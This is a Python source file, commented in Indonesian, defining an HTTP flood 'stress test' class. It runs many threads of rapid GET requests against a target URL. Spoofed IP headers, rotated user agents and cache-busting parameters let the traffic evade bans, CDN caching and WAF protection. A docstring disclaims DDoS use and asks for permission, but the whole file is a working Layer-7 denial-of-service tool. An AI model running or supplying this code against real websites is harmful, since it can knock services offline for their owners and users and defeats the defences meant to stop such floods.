import requests
import threading
import time
import random
import secrets
from typing import List

# * Modul Pengujian Beban Layer-7 (HTTP Flood)
class StressEngine:
    """
    StressEngine itu kayak stress test buat jembatan - kita uji apakah website bisa nahan beban berat.
    
    Bayangin website itu kayak toko:
    - Normalnya: 10-100 pengunjung per menit
    - Stress test: Kita datengin 1000+ pengunjung bareng-bareng
    
    TUJUANNYA BUKAN buat nge-DDoS (itu ilegal!), tapi:
    - Tau batas maksimal server
    - Cari tau apakah ada proteksi DDoS
    - Liat gimana website behave under pressure
    
    Cara kerja:
    
    1. MULTI-THREADING - Ribuan koneksi paralel
       - Setiap thread = 1 'pengunjung'
       - 50 threads = 50 pengunjung bareng-bareng
       - Bisa sampe 500+ threads
    
    2. REQUEST FLOOD - Banjir request
       - Tiap thread kirim request terus-terusan
       - Server bakal kewalahan kalo gak kuat
    
    3. CACHE BYPASS - Tembus proteksi
       - Pake IP random biar gak kebanned
       - Cache buster biar gak dilayanin dari cache
       - User-Agent random biar kayak banyak device berbeda
    
    4. REAL-TIME STATS - Laporan langsung
       - Request sukses
       - Request blocked (403, 429)
       - Error (500, timeout)
    
    HASILNYA:
    - Server kuat = bagus, siap production
    - Server down = perlu upgrade/optimasi
    - WAF ke-trigger = ada proteksi DDoS
    
    ⚠️ PENTING: Cuma pake di website LU SENDIRI atau yang ada ijin tertulis!
    """
    def __init__(self):
        self.isFlooding = False
        self.user_agents: List[str] = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
        ]

    def runHttpFlood(self, target: str, threads: int = 50, duration: int = 30) -> str:
        """Menjalankan pengujian beban aplikasi pada antarmuka HTTP.
        
        Args:
            target: String URL akhir peladen yang diuji cobakan.
            threads: Paralelisasi jumlah koneksi aktif.
            duration: Lamanya deteksi beban berjalan (detik).
            
        Returns:
            Status eksekusi sistem uji beban.
        """
        self.isFlooding = True
        
        def worker():
            session = requests.Session()
            end_time = time.time() + duration
            while time.time() < end_time and self.isFlooding:
                try:
                    # Manipulasi lalu lintas bypass tembolok aplikasi dinamis
                    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    cache_buster = secrets.token_hex(4)
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'X-Forwarded-For': fake_ip,
                        'X-Real-IP': fake_ip,
                        'Cache-Control': 'no-cache',
                        'Referer': f'https://www.google.com/search?q={cache_buster}'
                    }
                    
                    # Parameter penembus proksinya CDN
                    conn = '&' if '?' in target else '?'
                    attack_url = f"{target}{conn}stress_token={cache_buster}"
                    
                    session.get(attack_url, headers=headers, timeout=2)
                except Exception:
                    pass
            session.close()

        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
            
        return f"Pengujian beban dijalankan pada {target} (Utas: {threads}) selama {duration} detik."

    def stop(self) -> str:
        """Hentikan paksa seluruh fungsi beban latar belakang."""
        self.isFlooding = False
        return "Pengujian penbebanan peladen telah dihentikan."
